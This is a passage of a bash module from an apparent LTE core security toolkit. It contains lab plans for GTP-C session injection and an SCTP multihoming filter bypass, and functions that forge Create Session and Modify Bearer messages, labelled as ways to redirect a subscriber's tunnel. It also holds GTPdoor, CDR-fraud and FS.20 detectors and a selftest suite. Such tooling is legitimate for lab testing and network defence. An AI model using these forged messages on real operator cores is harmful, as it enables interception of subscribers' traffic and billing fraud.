session that never carried a real UE attach. Repeated injection exhausts
bearer and TEID space, and an accepted session redirects user-plane
traffic to an attacker-chosen address.

## What is already implemented in software
- GTP-C v2 header encode/decode with the TEID and the 24-bit sequence
  number (`--decode-gtp-c`), and the full IE walk with correct 4-octet
  padding.
- IE decode for IMSI (1), Cause (2), MSISDN (3), APN (71), TAI (87),
  ECGI (86) and ULI (114) with real TS 29.274 field layouts.
- GTP-U G-PDU header and extension-header-chain decode (`--decode-gtp-u`).

## What the handoff needs
1. A lab EPC: an S-GW and P-GW (Open5GS, free5GC, or srsRAN's
   srsepc) on a network you control.
2. The S-GW or P-GW GTP-C endpoint reachable on UDP 2123 and willing to
   accept a Create Session Request from an unknown peer address.
3. A valid TEID for the peer, learned from a legitimate Create Session
   Response captured on the same interface.
4. The attacker's own SGW/PGW F-TEID and an IP address the core can route
   to, so the created session has somewhere to point.

## Steps
1. Capture a legitimate attach on S11 and record the control TEID the
   S-GW uses in its Create Session Response.
2. Replay a Create Session Request with that TEID and a test IMSI.
3. Observe bearer allocation in the P-GW (a new TEID and charging record).
4. Repeat at rate to measure exhaustion.
5. `11_lte_core.sh --decode-gtp-u <hex>` on the resulting G-PDUs to
   confirm which TEIDs carry traffic.

## Safety
Creating sessions consumes core resources and generates charging records.
Confine it to a lab EPC and a test IMSI.
EOF
)
    lcore_plan_write "gtp-inject" "GTP-C v2 Create Session Request injection into a lab EPC" \
        "a lab EPC (Open5GS/free5GC/srsepc) with a GTP-C endpoint on UDP 2123 accepting Create Session Requests, plus a captured valid TEID and an attacker-owned F-TEID address" \
        "$body"
}

lcore_plan_sctp_scan() {
    local body
    body=$(cat <<'EOF'
# SCTP multihoming review against S1-MME / S6a transports

## What this does
SCTP (RFC 4960) is the transport for S1-MME (port 36412) and is an option
for Diameter S6a (port 3868). Its multihoming feature lets an endpoint add
or delete addresses on a live association with ASCONF chunks. A filter or
allow-list applied to the primary path only does not cover an address the
peer adds later, so an association can move traffic to a path the operator
never intended to expose.

## What is already implemented in software
- S1AP procedure and identity-carrier tables (`--plan sctp-scan` output and
  the `s1ap-*` verbs), naming which procedures carry subscriber identity.
- Diameter and GTP-C/GTP-U decoders to read whatever the association
  carries once it is up.

## What the handoff needs
1. A lab MME or eNB exposing SCTP on 36412, reachable with more than one
   local address (two NICs, or two addresses on one interface).
2. An SCTP tool that can send ASCONF and ASCONF-ACK: `sctp_test` from
   lksctp-tools, or `scapy` with the SCTP layer.
3. A middlebox or ACL on the primary path that is expected to filter the
   association, so the alternate path can be shown to bypass it.

## Steps
1. `ss -S` and confirm the multihomed association addresses.
2. Bring up an SCTP association to 36412 and complete the four-way
   handshake (INIT / INIT-ACK / COOKIE-ECHO / COOKIE-ACK).
3. Send ASCONF adding a second local address; wait for ASCONF-ACK.
4. Confirm the peer now accepts DATA chunks on the added path.
5. Show that a filter matching only the primary address no longer sees
   the S1AP payload.

## Safety
An SCTP association against a production MME is a denial-of-service risk.
Only exercise this against a lab core.
EOF
)
    lcore_plan_write "sctp-scan" "SCTP multihoming review against S1-MME and Diameter transports" \
        "a lab MME or eNB with SCTP on 36412 reachable over two or more local addresses, plus lksctp-tools (sctp_test) or scapy with the SCTP layer, and a middlebox on the primary path to demonstrate the bypass" \
        "$body"
}

lcore_cmd_plan() {
    local which="${1:-}" pf rc
    case "$which" in
        ulr-hijack)  pf=$(lcore_plan_ulr_hijack);  rc=$? ;;
        gtp-inject)  pf=$(lcore_plan_gtp_inject);  rc=$? ;;
        sctp-scan)   pf=$(lcore_plan_sctp_scan);   rc=$? ;;
        *)
            printf 'ERROR\tunknown plan: %s (want ulr-hijack|gtp-inject|sctp-scan)\n' \
                "$(lcore_sanitize "${which:-<none>}")" >&2
            return 2 ;;
    esac
    # A plan verb performs no action: it writes a plan file and says so.
    [[ "$rc" -eq 0 && -n "$pf" ]] || return "${rc:-1}"
    printf 'plan_file\t%s\n' "$pf"
    printf 'status\thandoff\n'
    printf 'note\t%s\n' "this vector needs the testbed named in the plan; no traffic was sent"
    return 0
}

# ── CLI verbs ───────────────────────────────────────────────────────────
lcore_cli_status_tsv() {
    local plans=0
    [[ -d "$LCORE_PLANS" ]] && plans=$(find "$LCORE_PLANS" -name '*.plan' -type f 2>/dev/null | wc -l)
    printf 'module\tlte_core\n'
    printf 'tag\tlcore\n'
    printf 'dir\t%s\n' "$LCORE_DIR"
    printf 'plans_dir\t%s\n' "$LCORE_PLANS"
    printf 'plans\t%s\n' "$plans"
    printf 's6a_app_id\t16777251\n'
    printf 'refs\tRFC 6733, TS 29.272, TS 29.274, TS 29.281, TS 36.413\n'
    printf 'decode_only\t%s\n' "$(lcore_find_core_testbed >/dev/null 2>&1 && echo no || echo yes)"
}

# Hardware guard: name what is missing rather than reporting an empty result.
lcore_find_core_testbed() {
    local t found=""
    for t in open5gs-mmed free5gc-mmed srsepc mme; do
        command -v "$t" >/dev/null 2>&1 && found+="${found:+,}$t"
    done
    [[ -n "$found" ]] && { echo "$found"; return 0; }
    return 1
}

lcore_require_core() {
    local c; c=$(lcore_find_core_testbed) || {
        printf 'ERROR\tno EPC testbed — install Open5GS (open5gs-mmed), free5GC (free5gc-mmed) or srsRAN (srsepc) to run a live S6a/GTP vector\n' >&2
        return 1
    }
    printf 'OK\t%s\n' "$c"
}

lcore_cmd_decode_diameter() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-diameter <hex>\n' >&2; return 2; }
    local hdr; hdr=$(lcore_diameter_parse_header "$hex") || return 1
    printf '%s\n' "$hdr"
    local body; body=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="body"{print $2}')
    [[ -n "$body" ]] && lcore_diameter_parse_avps "$body"
    return 0
}

lcore_cmd_decode_gtp_c() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-gtp-c <hex>\n' >&2; return 2; }
    local hdr; hdr=$(lcore_gtpc_parse_header "$hex") || return 1
    printf '%s\n' "$hdr"
    local payload; payload=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="payload"{print $2}')
    [[ -n "$payload" ]] && lcore_gtpc_parse_ies "$payload"
    return 0
}

lcore_cmd_decode_gtp_u() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-gtp-u <hex>\n' >&2; return 2; }
    lcore_gtpu_parse_header "$hex"
}

lcore_cmd_build_air() {
    local imsi="${1:-310150123456789}"
    local msg; msg=$(lcore_build_air "$imsi" "${2:-mme.localdomain}" "${3:-localdomain}" "${4:-1}") || return 1
    printf 'message\tAuthentication-Information-Request (AIR)\n'
    printf 'command_code\t318\n'
    printf 'application_id\t16777251\n'
    printf 'imsi\t%s\n' "$imsi"
    printf 'octets\t%s\n' "$(( ${#msg} / 2 ))"
    printf 'hex\t%s\n' "$msg"
    # Prove the build by parsing it back.
    local hdr; hdr=$(lcore_diameter_parse_header "$msg") || return 1
    printf 'roundtrip_command\t%s\n' "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="command_code"{print $2}')"
    printf 'roundtrip_app\t%s\n'     "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="application_id"{print $2}')"
    printf 'roundtrip_R\t%s\n'       "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="flag_R"{print $2}')"
    printf 'roundtrip_length_ok\t%s\n' "$([[ "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="length_mismatch"{print $2}')" == "no" ]] && echo yes || echo no)"
}

lcore_cmd_build_ulr() {
    local imsi="${1:-310150123456789}"
    local msg; msg=$(lcore_build_ulr "$imsi" "${2:-mme.localdomain}" "${3:-localdomain}" "${4:-02F810}" "${5:-6}" "${6:-0}") || return 1
    printf 'message\tUpdate-Location-Request (ULR)\n'
    printf 'command_code\t316\n'
    printf 'application_id\t16777251\n'
    printf 'imsi\t%s\n' "$imsi"
    printf 'octets\t%s\n' "$(( ${#msg} / 2 ))"
    printf 'hex\t%s\n' "$msg"
    local hdr; hdr=$(lcore_diameter_parse_header "$msg") || return 1
    printf 'roundtrip_command\t%s\n' "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="command_code"{print $2}')"
    printf 'roundtrip_length_ok\t%s\n' "$([[ "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="length_mismatch"{print $2}')" == "no" ]] && echo yes || echo no)"
}

# ── GTP-C session hijack (TS 29.274) ────────────────────────────────────
# The control plane that owns every subscriber's data tunnel trusts any peer
# on the GRX/IPX fabric. Forging a Create Session Request allocates a bearer;
# forging a Modify Bearer reassigns an existing bearer's S1-U F-TEID. Either
# redirects the user plane (interception) and mis-attributes the traffic on
# the charging record (overbilling).

# digits -> BCD with an F nibble on an odd tail (the IMSI coding).
lcore_bcd_encode() {
    local d="${1:-}"
    [[ "$d" =~ ^[0-9]+$ && ${#d} -ge 2 ]] || { printf 'ERROR\tdigits required\n' >&2; return 2; }
    local out="" i n=${#d} lo hi
    for (( i = 0; i < n; i += 2 )); do
        lo="${d:i:1}"
        if (( i + 1 < n )); then hi="${d:i+1:1}"; else hi="F"; fi
        out+="${hi}${lo}"
    done
    printf '%s' "$out"
}
# One GTP-C IE: type(1) length(2) spare/instance(1) value, padded to a
# 4-octet boundary; padding is not counted in Length.
lcore_gtpc_ie() {
    local type="${1:-}" val; val=$(lcore_nfc "${2:-}")
    local inst="${3:-0}"
    [[ "$type" =~ ^[0-9]+$ ]] || { printf 'ERROR\tIE type must be numeric\n' >&2; return 2; }
    lcore_is_hex "$val" || { printf 'ERROR\tIE value must be hex\n' >&2; return 2; }
    local len=$(( ${#val} / 2 ))
    local ie; printf -v ie '%02X%04X%02X%s' "$(( type & 0xFF ))" "$(( len & 0xFFFF ))" "$(( inst & 0x0F ))" "$val"
    while (( (${#ie} / 2) % 4 != 0 )); do ie+="00"; done
    printf '%s' "$ie"
}
# A GTPv2-C message: Flags(1) Type(1) Length(2) [TEID(4)] Seq(3) Spare(1) body.
lcore_gtpc_msg() {
    local type="${1:-}" teid="${2:-}" seq="${3:-0}" payload; payload=$(lcore_nfc "${4:-}")
    local T=0 teid_hex=""
    if [[ -n "$teid" ]]; then T=1; teid_hex=$(printf '%08X' "$(( 16#$teid ))"); fi
    local flags; printf -v flags '%02X' "$(( (2 << 5) | (T << 3) ))"
    local tail=$(( (T ? 4 : 0) + 4 + ${#payload} / 2 ))
    local out; printf -v out '%s%02X%04X%s' "$flags" "$(( type & 0xFF ))" "$(( tail & 0xFFFF ))" "$teid_hex"
    printf -v out '%s%06X00' "$out" "$(( seq & 0xFFFFFF ))"
    printf '%s%s' "$out" "$payload"
}
# PLMN to 3 BCD octets, TS 24.008 §10.5.1.3 (Serving Network IE 111).
lcore_plmn_bcd() {
    local mcc="${1:-}" mnc="${2:-}" o1 o2 o3
    [[ "$mcc" =~ ^[0-9]{3}$ && "$mnc" =~ ^[0-9]{2,3}$ ]] || { printf 'ERROR\tMCC 3 digits, MNC 2 or 3\n' >&2; return 2; }
    o1=$(( (10#${mcc:1:1} << 4) | 10#${mcc:0:1} ))
    if (( ${#mnc} == 3 )); then o2=$(( (10#${mnc:2:1} << 4) | 10#${mcc:2:1} ))
    else o2=$(( (0xF << 4) | 10#${mcc:2:1} )); fi
    o3=$(( (10#${mnc:1:1} << 4) | 10#${mnc:0:1} ))
    printf '%02X%02X%02X' "$o1" "$o2" "$o3"
}
lcore_apn_encode() {
    local apn="${1:-}" out="" label lhex
    [[ -n "$apn" ]] || { printf 'ERROR\tAPN required\n' >&2; return 2; }
    local IFS='.'
    for label in $apn; do
        [[ "$label" =~ ^[A-Za-z0-9-]+$ ]] || { printf 'ERROR\tbad APN label: %s\n' "$label" >&2; return 2; }
        lhex=$(printf '%s' "$label" | od -An -tx1 | tr -d ' \n')
        out+=$(printf '%02x%s' "${#label}" "$lhex")
    done
    printf '%s' "$out"
}
lcore_cmd_gtp_csr_forge() {
    local imsi="${1:-310150123456789}" apn="${2:-internet}" mcc="${3:-310}" mnc="${4:-260}"
    [[ "$imsi" =~ ^[0-9]{10,15}$ ]] || { printf 'ERROR\tIMSI must be 10..15 digits\n' >&2; return 2; }
    local imsi_ie apn_ie sn_ie msg
    imsi_ie=$(lcore_gtpc_ie 1 "$(lcore_bcd_encode "$imsi")") || return 2
    apn_ie=$(lcore_gtpc_ie 71 "$(lcore_apn_encode "$apn")") || return 2
    sn_ie=$(lcore_gtpc_ie 111 "$(lcore_plmn_bcd "$mcc" "$mnc")") || return 2
    msg=$(lcore_gtpc_msg 32 "" 1 "${imsi_ie}${apn_ie}$(lcore_gtpc_ie 82 06)${sn_ie}")
    printf 'message_type\t32\nmessage_name\t%s\nimsi\t%s\napn\t%s\nimsi_ie\t%s\nmessage\t%s\n' \
        "$(lcore_gtpc_msg_name 32)" "$imsi" "$apn" "$imsi_ie" "$msg"
    printf 'attack\tforged Create Session Request — the SGW allocates an EPS bearer for this IMSI; point the F-TEID it returns at your endpoint to take the user plane\n'
}
lcore_cmd_gtp_modify_bearer() {
    local teid="${1:-}" ebi="${2:-5}"
    [[ "$teid" =~ ^[0-9A-Fa-f]{1,8}$ ]] || { printf 'ERROR\tTEID is up to 8 hex digits\n' >&2; return 2; }
    [[ "$ebi" =~ ^[0-9]+$ ]] || { printf 'ERROR\tEBI must be numeric\n' >&2; return 2; }
    local bc msg
    bc=$(lcore_gtpc_ie 93 "$(lcore_gtpc_ie 73 "$(printf '%02X' "$(( ebi & 0xFF ))")")") || return 2
    msg=$(lcore_gtpc_msg 34 "$teid" 2 "$bc")
    printf 'message_type\t34\nmessage_name\t%s\nteid\t%s\nebi\t%s\nmessage\t%s\n' \
        "$(lcore_gtpc_msg_name 34)" "$teid" "$ebi" "$msg"
    printf 'attack\tforged Modify Bearer on a live session — updates the S1-U F-TEID for the bearer (the handover path legitimately does this), redirecting the subscriber tunnel\n'
}
# GTPdoor rides Echo Request/Response as a C2 channel. A clean Echo carries a
# single Recovery IE; extra IEs or a payload without Recovery is the tell.
lcore_cmd_gtpdoor() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 2; }
    local hdr type pl
    hdr=$(lcore_gtpc_parse_header "$hex") || return 1
    type=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="message_type"{print $2}')
    pl=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="payload"{print $2}')
    printf 'message_type\t%s\nmessage_name\t%s\n' "$type" "$(lcore_gtpc_msg_name "$type")"
    local n=0
    if (( type == 1 || type == 2 )); then
        if [[ -n "$pl" ]]; then
            local ies weird recy
            ies=$(lcore_gtpc_parse_ies "$pl" 2>/dev/null) || ies=""
            weird=$(printf '%s\n' "$ies" | awk -F'\t' '$1 ~ /\.type$/ && $2 != 3 {n++} END{print n+0}')
            (( weird > 0 )) && { printf 'finding\tHIGH\tEcho carries %s non-Recovery IE(s) — GTPdoor-class covert channel\n' "$weird"; n=$(( n + 1 )); }
            recy=$(printf '%s\n' "$ies" | awk -F'\t' '$1 ~ /\.name$/ && $2 ~ /Recovery/ {print "yes"; exit}')
            [[ "$recy" != yes ]] && { printf 'finding\tHIGH\tEcho has a payload but no Recovery IE — malformed Echo abuse\n'; n=$(( n + 1 )); }
        fi
        (( n == 0 )) && printf 'finding\tINFO\tshape consistent with a plain Echo\n'
    else
        printf 'finding\tINFO\tnot an Echo message; GTPdoor rides Echo Request/Response\n'
    fi
    printf 'findings\t%s\n' "$n"
}
# CDR anomaly: a subscriber whose per-session volume is implausible against
# their own baseline is the overbilling/bypass signature.
lcore_cmd_cdr_fraud() {
    local file="${1:-}"
    [[ -f "$file" ]] || { printf 'ERROR\tno such CDR file: %s\n' "$file" >&2; return 1; }
    printf 'imsi\tbytes_s\tavg_bytes\tfactor\tverdict\n'
    awk -F'\t' 'NR==1 && $1 ~ /^imsi/ { next }
        NF>=3 { imsi=$1; b=$2+0; a=$3+0; f=(a>0)?b/a:0;
                v=(f>10)?"OVERBILLING":(f>5)?"SUSPECT":"normal";
                printf "%s\t%d\t%d\t%.1f\t%s\n", imsi, b, a, f, v }' "$file"
}
# GSMA FS.20 — the GTP interconnect controls.
lcore_cmd_fs20() {
    local file="${1:-}"
    [[ -f "$file" ]] || { printf 'ERROR\tno such config: %s\n' "$file" >&2; return 1; }
    local imsi_plmn="" whitelist="" echo_anom="" cdr_anom="" teid_valid="" line k v
    while IFS= read -r line; do
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ "$line" == *=* ]] || continue
        k=$(printf '%s' "${line%%=*}" | tr -d ' ' | tr 'A-Z' 'a-z'); v="${line#*=}"
        case "$k" in
            imsi_plmn_consistency) imsi_plmn="$v" ;;
            peer_whitelist|ip_whitelist) whitelist="$v" ;;
            echo_anomaly|echo_anomaly_detection) echo_anom="$v" ;;
            cdr_anomaly|cdr_anomaly_detection) cdr_anom="$v" ;;
            teid_validation|sanity_checks) teid_valid="$v" ;;
        esac
    done < "$file"
    printf 'control\tpresent\tseverity_if_missing\tdetail\n'
    printf 'imsi_plmn_consistency\t%s\tHIGH\tIMSI must belong to the Serving Network PLMN (FS.20)\n' "$([[ "$imsi_plmn" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    printf 'peer_whitelist\t%s\tHIGH\tGTP-C peers restricted to whitelisted interconnect addresses\n' "$([[ "$whitelist" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    printf 'echo_anomaly\t%s\tMEDIUM\tEcho Request/Recovery anomaly detection (GTPdoor)\n' "$([[ "$echo_anom" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    printf 'cdr_anomaly\t%s\tMEDIUM\tCDR volume/duration anomaly detection\n' "$([[ "$cdr_anom" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    printf 'teid_validation\t%s\tMEDIUM\tTEID and IE sanity checks on inbound GTP-C\n' "$([[ "$teid_valid" =~ ^(true|yes|1|on)$ ]] && echo yes || echo no)"
    local missing=0
    for v in "$imsi_plmn" "$whitelist" "$echo_anom" "$cdr_anom" "$teid_valid"; do
        [[ "$v" =~ ^(true|yes|1|on)$ ]] || missing=$(( missing + 1 ))
    done
    printf 'controls_missing\t%d\n' "$missing"
}

# ── selftest — no radio, no root, no network ────────────────────────────
lcore_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad + 1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    export LOOT_DIR="$d/loot"
    export CAPTURES_DIR="$d/captures"
    export STATE_DIR="$d/state"
    export LCORE_DIR="$d/loot/lte_core"
    export LCORE_PLANS="$LCORE_DIR/plans"

    # ── 1. Diameter header parse of a hand-built message ────────────────
    # Hand-built AIR-shaped header with no AVPs: version 1, length 20 (0x14),
    # flags 0xC0 (R|P), command 318 (0x00013E), app 16777251 (0x01000023),
    # hop-by-hop 1, end-to-end 1.
    local hdr="01000014C000013E010000230000000100000001"
    out=$(lcore_diameter_parse_header "$hdr"); rc=$?
    chk dh-rc        "$rc" "0"
    chk dh-version   "$(fld "$out" version)" "1"
    chk dh-length    "$(fld "$out" length)" "20"
    chk dh-flags     "$(fld "$out" flags)" "C0"
    chk dh-R         "$(fld "$out" flag_R)" "1"
    chk dh-P         "$(fld "$out" flag_P)" "1"
    chk dh-E         "$(fld "$out" flag_E)" "0"
    chk dh-T         "$(fld "$out" flag_T)" "0"
    chk dh-cmd       "$(fld "$out" command_code)" "318"
    chk dh-cmdname   "$(fld "$out" command_name)" "Authentication-Information (AIR/AIA)  [S6a/S6d]"
    chk dh-app       "$(fld "$out" application_id)" "16777251"
    chk dh-appname   "$(fld "$out" application_name)" "3GPP S6a/S6d"
    chk dh-hbh       "$(fld "$out" hop_by_hop_id)" "1"
    chk dh-e2e       "$(fld "$out" end_to_end_id)" "1"
    chk dh-lenmismatch "$(fld "$out" length_mismatch)" "no"
    chk dh-body-empty "$(fld "$out" body)" ""

    # Message Length is 24-bit and must be read big-endian: 0x000100 = 256.
    out=$(lcore_diameter_parse_header "01000100C000013E010000230000000100000001")
    chk dh-length-24 "$(fld "$out" length)" "256"
    chk dh-lenmismatch2 "$(fld "$out" length_mismatch | cut -d" " -f1)" "yes"

    # Flag decoding must be positional, not "any bit set".
    out=$(lcore_diameter_parse_header "010000148000013E010000230000000100000001")
    chk dh-flags-onlyR "$(fld "$out" flag_R)" "1"
    chk dh-flags-P0    "$(fld "$out" flag_P)" "0"
    out=$(lcore_diameter_parse_header "010000142000013E010000230000000100000001")
    chk dh-flags-onlyE "$(fld "$out" flag_E)" "1"
    chk dh-flags-R0    "$(fld "$out" flag_R)" "0"

    chk dh-short   "$(lcore_diameter_parse_header 01000014 >/dev/null 2>&1; echo $?)" "1"
    chk dh-nonhex  "$(lcore_diameter_parse_header zzzz >/dev/null 2>&1; echo $?)" "1"
    chk dh-missing "$(lcore_cmd_decode_diameter >/dev/null 2>&1; echo $?)" "2"

    # ── 2. AVP walk, including a grouped AVP ────────────────────────────
    # Origin-Host (264) "mme" : 00000108 40 00000C 6D6D652E... build it.
    local oh; oh=$(lcore_diameter_build_utf8_avp 264 "mme" M)
    chk avp-oh-code "$(printf '%s' "$oh" | cut -c1-8)" "00000108"
    chk avp-oh-flags "$(printf '%s' "$oh" | cut -c9-10)" "40"
    # "mme" = 3 octets, header 8, length = 11, padded to 12.
    chk avp-oh-len  "$(printf '%s' "$oh" | cut -c11-16)" "00000B"
    chk avp-oh-total "$(printf '%s' "$oh" | wc -c)" "24"
    chk avp-oh-pad  "$(printf '%s' "$oh" | cut -c23-24)" "00"

    out=$(lcore_diameter_parse_avps "$oh")
    chk avp-oh-p-code "$(fld "$out" avp.0.code)" "264"
    chk avp-oh-p-name "$(fld "$out" avp.0.name)" "Origin-Host"
    chk avp-oh-p-M    "$(fld "$out" avp.0.M)" "1"
    chk avp-oh-p-V    "$(fld "$out" avp.0.V)" "0"
    chk avp-oh-p-len  "$(fld "$out" avp.0.length)" "11"
    chk avp-oh-p-data "$(fld "$out" avp.0.data)" "6D6D65"
    chk avp-oh-p-text "$(fld "$out" avp.0.decoded)" "Origin-Host=mme"
    chk avp-oh-count  "$(fld "$out" avp_count)" "1"

    # Two AVPs in sequence must both be walked.
    local u32; u32=$(lcore_diameter_build_u32_avp 1410 5 M)
    out=$(lcore_diameter_parse_avps "${oh}${u32}")
    chk avp-two-count "$(fld "$out" avp_count)" "2"
    chk avp-two-1code "$(fld "$out" avp.1.code)" "1410"
    chk avp-two-1dec  "$(fld "$out" avp.1.decoded)" "Number-Of-Requested-Vectors=5"

    # A vendor-specific AVP carries a 4-octet Vendor-Id and a 12-octet header.
    local vs; vs=$(lcore_diameter_build_u32_avp 1410 3 V 10415)
    out=$(lcore_diameter_parse_avps "$vs")
    chk avp-vs-V     "$(fld "$out" avp.0.V)" "1"
    chk avp-vs-vid   "$(fld "$out" avp.0.vendor_id)" "10415"
    chk avp-vs-len   "$(fld "$out" avp.0.length)" "16"
    chk avp-vs-data  "$(fld "$out" avp.0.data)" "00000003"

    # A GROUPED AVP: Requested-EUTRAN-Authentication-Info (1408) holding
    # Number-Of-Requested-Vectors (1410) and Immediate-Response-Preferred (1413).
    local g_in; g_in="$(lcore_diameter_build_u32_avp 1410 2 M)$(lcore_diameter_build_u32_avp 1413 0 M)"
    local grouped; grouped=$(lcore_diameter_build_avp 1408 "$g_in" M)
    out=$(lcore_diameter_parse_avps "$grouped")
    chk avp-group-code "$(fld "$out" avp.0.code)" "1408"
    chk avp-group-len  "$(fld "$out" avp.0.length)" "32"
    chk avp-group-dlen "$(fld "$out" avp.0.data_octets)" "24"
    chk avp-group-note "$(printf '%s\n' "$out" | grep -c 'grouped')" "1"
    # Walk the inner AVPs of the grouped value: the walk must find both.
    local inner; inner=$(fld "$out" avp.0.data)
    out=$(lcore_diameter_parse_avps "$inner")
    chk avp-inner-count "$(fld "$out" avp_count)" "2"
    chk avp-inner-0code "$(fld "$out" avp.0.code)" "1410"
    chk avp-inner-0dec  "$(fld "$out" avp.0.decoded)" "Number-Of-Requested-Vectors=2"
    chk avp-inner-1code "$(fld "$out" avp.1.code)" "1413"
    chk avp-inner-1dec  "$(fld "$out" avp.1.decoded)" "Immediate-Response-Preferred=0"

    # A declared AVP length longer than the bytes present is rejected.
    chk avp-truncated "$(lcore_diameter_parse_avps 00000108400000FF >/dev/null 2>&1; echo $?)" "1"
    # A zero-length AVP is below the 8-octet minimum and is rejected.
    chk avp-zero-len  "$(lcore_diameter_parse_avps 0000010840000000 >/dev/null 2>&1; echo $?)" "1"
    # A well-formed but value-less AVP parses.
    chk avp-min-len   "$(lcore_diameter_parse_avps 0000010840000008 >/dev/null 2>&1; echo $?)" "0"

    # ── 3. Command-code classification ──────────────────────────────────
    chk cc-316 "$(lcore_diameter_command_name 316)" "Update-Location (ULR/ULA)  [S6a/S6d]"
    chk cc-317 "$(lcore_diameter_command_name 317)" "Cancel-Location (CLR/CLA)  [S6a/S6d]"
    chk cc-318 "$(lcore_diameter_command_name 318)" "Authentication-Information (AIR/AIA)  [S6a/S6d]"
    chk cc-319 "$(lcore_diameter_command_name 319)" "Insert-Subscriber-Data (IDR/IDA)  [S6a/S6d]"
    chk cc-320 "$(lcore_diameter_command_name 320)" "Delete-Subscriber-Data (DSR/DSA)  [S6a/S6d]"
    chk cc-321 "$(lcore_diameter_command_name 321)" "Purge-UE (PUR/PUA)  [S6a/S6d]"
    chk cc-322 "$(lcore_diameter_command_name 322)" "Reset (RSR/RSA)  [S6a/S6d]"
    chk cc-323 "$(lcore_diameter_command_name 323)" "Notify (NOR/NOA)  [S6a/S6d]"
    chk cc-9999 "$(lcore_diameter_command_name 9999)" "unassigned/unknown"
    # Request vs answer classification.
    # Direction is the R bit, and one code yields both directions.
    chk ccr-req-80 "$(lcore_diameter_flags_is_request 80 && echo req || echo ans)" "req"
    chk ccr-req-c0 "$(lcore_diameter_flags_is_request c0 && echo req || echo ans)" "req"
    chk ccr-ans-00 "$(lcore_diameter_flags_is_request 00 && echo req || echo ans)" "ans"
    chk ccr-ans-40 "$(lcore_diameter_flags_is_request 40 && echo req || echo ans)" "ans"
    chk ccr-bad    "$(lcore_diameter_flags_is_request zz >/dev/null 2>&1; echo $?)" "1"
    chk ccr-empty  "$(lcore_diameter_flags_is_request '' >/dev/null 2>&1; echo $?)" "1"
    chk cc-shared  "$(lcore_diameter_command_name 316 | grep -c 'ULR/ULA')" "1"
    chk app-s6a "$(lcore_diameter_app_name 16777251)" "3GPP S6a/S6d"
    chk app-gx  "$(lcore_diameter_app_name 16777219)" "3GPP Gx"
    chk app-unk "$(lcore_diameter_app_name 424242)"  "unknown"
    chk rc-2001 "$(lcore_diameter_result_code 2001)" "DIAMETER_SUCCESS (2001)"
    chk rc-5001 "$(lcore_diameter_result_code 5001)" "DIAMETER_USER_UNKNOWN / 3GPP: User-Unknown (5001)"
    chk rc-5420 "$(lcore_diameter_result_code 5420)" "DIAMETER_ERROR_UNKNOWN_EPS_SUBSCRIPTION (5420)"

    # ── 4. AVP code registry (the codes the brief names) ────────────────
    chk avpn-263  "$(lcore_diameter_avp_name 263)"  "Session-Id"
    chk avpn-264  "$(lcore_diameter_avp_name 264)"  "Origin-Host"
    chk avpn-1    "$(lcore_diameter_avp_name 1)"    "User-Name"
    chk avpn-277  "$(lcore_diameter_avp_name 277)"  "Auth-Session-State"
    chk avpn-1407 "$(lcore_diameter_avp_name 1407)" "Visited-PLMN-Id"
    chk avpn-1408 "$(lcore_diameter_avp_name 1408)" "Requested-EUTRAN-Authentication-Info"
    chk avpn-1410 "$(lcore_diameter_avp_name 1410)" "Number-Of-Requested-Vectors"
    chk avpn-1447 "$(lcore_diameter_avp_name 1447)" "GPRS-Subscription-Data"
    chk avpn-1448 "$(lcore_diameter_avp_name 1448)" "RAND"
    chk avpn-1449 "$(lcore_diameter_avp_name 1449)" "AUTN"
    chk avpn-1450 "$(lcore_diameter_avp_name 1450)" "XRES"
    chk avpn-1451 "$(lcore_diameter_avp_name 1451)" "KASME"
    chk avpn-285  "$(lcore_diameter_avp_name 285)"  "Origin-Realm"

    # ── 5. Built AIR/ULR round-trip ─────────────────────────────────────
    out=$(lcore_cmd_build_air 310150123456789); rc=$?
    chk air-rc      "$rc" "0"
    chk air-cmd     "$(fld "$out" roundtrip_command)" "318"
    chk air-app     "$(fld "$out" roundtrip_app)" "16777251"
    chk air-R       "$(fld "$out" roundtrip_R)" "1"
    chk air-lenok   "$(fld "$out" roundtrip_length_ok)" "yes"
    local airhex; airhex=$(fld "$out" hex)
    chk air-version "$(printf '%s' "$airhex" | cut -c1-2)" "01"
    # Walk the AVPs of the built message and confirm the required ones.
    out=$(lcore_cmd_decode_diameter "$airhex")
    chk air-has-session  "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.name$/ && $2=="Session-Id"{print "yes"; exit}')" "yes"
    chk air-uname        "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="User-Name=310150123456789"{print "yes"; exit}')" "yes"
    chk air-plmn         "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="Visited-PLMN-Id=208-01"{print "yes"; exit}')" "yes"
    # Number-Of-Requested-Vectors lives INSIDE the grouped
